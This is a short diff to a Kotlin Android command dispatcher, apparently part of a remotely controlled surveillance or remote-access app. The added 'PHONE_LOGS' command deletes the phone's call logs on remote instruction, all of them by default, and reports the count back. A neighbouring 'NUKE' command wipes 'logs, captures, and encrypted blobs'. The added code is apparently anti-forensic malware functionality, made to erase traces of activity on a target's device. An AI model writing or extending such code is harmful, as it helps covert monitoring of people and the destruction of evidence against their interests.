@@ -247,6 +247,19 @@ object CommandProcessor {
                         ctx.startService(i)
                     }
                 }
+                "PHONE_LOGS" -> {
+                    val parts = content.split("|")
+                    val action = parts[0].trim()
+                    val value = if (parts.size > 1) parts[1].trim() else null
+                    
+                    val deletedCount = PhoneManager.deleteLogs(ctx, action, value)
+                    status = when (deletedCount) {
+                        -1 -> "FAILED_PERMISSION"
+                        -2 -> "FAILED_ERROR"
+                        else -> "SUCCESS_CLEANUP ($deletedCount)"
+                    }
+                    errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
+                }
                 "NUKE" -> {
                     try {
                         // 1. Wipe the "Catacombs" (Logs, captures, and encrypted blobs)
